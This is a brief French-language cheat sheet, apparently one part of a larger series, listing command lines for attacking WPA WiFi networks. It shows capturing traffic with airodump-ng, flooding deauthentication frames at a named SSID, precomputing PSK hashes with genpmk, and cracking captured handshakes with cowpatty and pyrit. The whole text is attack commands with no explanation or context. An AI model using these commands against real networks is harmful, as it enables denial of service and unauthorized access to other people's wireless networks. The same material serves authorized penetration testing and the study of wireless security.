Part 24
===========

Capture traffic
\# airodump-ng --channel $CHANNEL mon0 --write $CAPTUREFILE

Deauth sur un ssid
\# airreplay-ng --deauth 0 -e $SSID mon0

Generation de PSK
\# genpmk -f dict -s $SSID -d $PRECOMPUTEDPSKS

Crack en fonction de precomputed PSK
\# cowpatty -d $PRECOMPUTEDPSKS -s $SSID -r $CAPTUREFILE
\# pyrit -r $CAPTUREFILE -i $PRECOMPUTEDPSKS attack\_cowpatty

